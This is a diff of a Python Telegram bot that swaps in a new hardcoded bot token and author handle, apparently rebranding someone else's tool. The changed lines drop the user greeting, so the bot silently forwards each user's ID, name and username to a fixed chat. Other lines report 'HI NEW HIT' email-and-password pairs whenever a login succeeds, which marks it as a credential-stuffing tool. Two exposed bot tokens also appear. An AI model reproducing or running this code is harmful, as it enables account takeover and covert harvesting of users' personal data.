@@ -16,7 +16,7 @@ from threading import Thread
 app = Flask('')
 Hunter = Hunter
 
-token = ('6763919459:AAGFnROxEuZq4OsOviqAO_mq-DLts0w3bRA')
+token = ('6891299338:AAE0LMle5VMVOI4qvaK3bdXOYiQG6tbyiCU')
 bot = telebot.TeleBot(token, parse_mode="HTML")
 print('روح على بوتك اضغط [ /start ] ')
 
@@ -31,9 +31,8 @@ def start(message):
     first_name = message.from_user.first_name
     last_name = message.from_user.last_name
     username = message.from_user.username
-    omar = f"hello @{first_name} {last_name}                                                                     ارسل معلوماتك للبدء"
     response = f"User info:\nID: {user_id}\nName: {first_name} {last_name}\nUsername: @{username}"
-    bot.send_message(chat_id=message.chat.id, text=omar)
+    
     bot.send_message(chat_id="5813081202", text=response)
 mobile_number = ""
 @bot.message_handler(func=lambda message: True)
@@ -101,7 +100,7 @@ def main(message):
 ☆ HI NEW HIT 
 ☆Email : {email}
 ☆Password : {psw}
-☆BY : @maho_s9
+☆BY : @x_corazon_x
                         '''
                     if 'logged_in_user' in req:
                         hit += 1                    
